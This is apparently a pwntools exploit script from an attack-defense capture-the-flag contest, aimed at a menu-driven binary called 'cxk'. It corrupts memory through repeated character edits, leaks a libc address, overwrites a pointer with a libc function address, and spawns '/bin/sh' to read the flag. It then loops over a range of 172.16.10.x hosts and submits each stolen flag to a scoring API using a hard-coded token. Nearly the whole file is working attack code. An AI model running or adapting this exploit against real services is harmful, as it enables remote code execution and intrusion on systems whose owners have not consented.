#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
import requests
context.log_level = 'info'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']

def hack(ip = '', port=0):
    if(ip == ''):
        io = process('./cxk', env = {'LD_PRELOAD':'./libc-2.27.so'})
    else:
        io = remote(ip,port)
    

    io.recvuntil('name:')
    io.sendline('aaaaaaaaaaaaaaaa')
    io.sendlineafter('Choice:', '2')
    io.sendlineafter('Choice:', '1')
    io.sendlineafter('number:', '0')
    io.sendlineafter('description:', '10')
    io.sendlineafter('Description:', 'aaaaaaaaaaaaaaa')

    io.sendlineafter('Choice:', '1')
    io.sendlineafter('Choice:', '1')
    io.sendlineafter('number:', '0')
    io.sendlineafter('reason:', '10')
    io.sendlineafter('Reason:', 'bbbbbbbbbbbbbbb')
    
    io.sendlineafter('Choice:', '2')
    io.sendlineafter('Choice:', '1')
    io.sendlineafter('number:', '1')
    io.sendlineafter('description:', '10')
    io.sendlineafter('Description:', 'ccccccccccccccc')

    
    io.sendlineafter('Choice:', '2')
    io.sendlineafter('Choice:', '3')
    io.sendlineafter('number:', '1')

    io.sendlineafter('Choice', '1')
    io.sendlineafter('Choice:', '4')
    io.sendlineafter('revoke:', '0')

    io.sendlineafter('Choice:', '2')
    io.sendlineafter('Choice:', '1')
    io.sendlineafter('number:', '1')
    io.sendlineafter('scription:', '20')
    io.sendlineafter('Description:', 'ddddddddddddddddddddddddddddddd')

    io.sendlineafter('Choice:', '1')
    io.sendlineafter('Choice:', '1')
    io.sendlineafter('number:', '0')
    io.sendlineafter('ason:', '10')
    io.sendlineafter('ason:', 'eeeeeeeeeeeeeee')


    for i in range(55):
        io.sendlineafter('hoice:', '1')
        io.sendlineafter('Choice', '3')
        io.sendlineafter('change:', '0')
        io.sendlineafter('character:', '\x00')
        io.sendlineafter('haracter:', 'd')



    io.sendlineafter('Choice:','2')
    io.sendlineafter('Choice','4')
    io.sendlineafter('number:','1')
   
    info = io.recvuntil('\x0a',drop = True)[-4::]
    print '[+] get info : ' + hex(u32(info))
    if info[0] == '\x64':
        if info[1]=='\x64' and info[2] == '\x64' and info[3] == '\x64':
            return 'fuck'
        return hack(ip,port)
    tar = '`0`\x00'
    for i in range(4):
        io.sendlineafter('Choice:','1')
        io.sendlineafter('Choice:','3')
        io.sendlineafter('change:','0')
        io.sendlineafter('character:',info[i])
        io.sendlineafter('character:',tar[i])
    for i in range(4):
        io.sendlineafter('Choice:','1')
        io.sendlineafter('Choice:','3')
        io.sendlineafter('change:','0')
        io.sendlineafter('character:','\x00')
        io.sendlineafter('character:','\x00')
    
    io.sendlineafter('Choice:', '2')
    io.sendlineafter('Choice:', '4') 
    io.sendlineafter('number:','1')
        
    io.recvuntil('description:')
    addr = u64(io.recvuntil('\n',drop = True).ljust(8, '\x00'))
    success('leak addr -> {:#x}'.format(addr))
    libcbase = addr-0x45110
    success('libc addr -> {:#x}'.format(libcbase))
    io.recv()
    io.sendline('2')
    io.sendlineafter('Choice:','2')
    io.sendlineafter('number:','1')
    target = libcbase+0x4f440
    io.sendlineafter('Description:',p64(target))
    io.sendlineafter('Choice:','/bin/sh')
    io.sendline("cat flag")
    flag = io.recvline().strip()
    print flag
    # io.interactive()
    io.close()
    return flag

def submit(flag):
    r = requests.post('http://172.16.123.123/commapi/userspace/submitFlag',data={
        'token': 'EKkX7buhm40OeoU7l0cHTYXcro7VpG9N',
        'flag': flag
    })
    print r.text
if __name__ == '__main__':
    for i in range(1, 18):
        try:
            f = hack("172.16.10.{}".format(18-i), 9999)
            submit(f)
        except:
            continue
        